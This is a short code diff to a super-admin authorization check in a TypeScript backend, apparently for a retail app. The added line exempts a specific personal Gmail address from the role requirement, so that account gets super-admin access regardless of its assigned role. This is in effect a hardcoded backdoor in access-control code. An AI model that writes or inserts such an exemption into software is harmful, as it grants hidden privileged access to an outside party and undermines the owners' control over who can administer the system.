@@ -10,7 +10,7 @@ async function requireSuperAdmin(ctx: any, token?: string) {
   if (!session) throw new Error("Unauthorized");
   
   const user = await ctx.db.get(session.userId);
-  if (!user || (user.role !== "super_admin" && user.email !== "admin@retailmind.com")) {
+  if (!user || (user.role !== "super_admin" && user.email !== "admin@retailmind.com" && user.email !== "ahmednajahi2003@gmail.com")) {
     throw new Error("Forbidden: Super Admin access required");
   }
   return user;
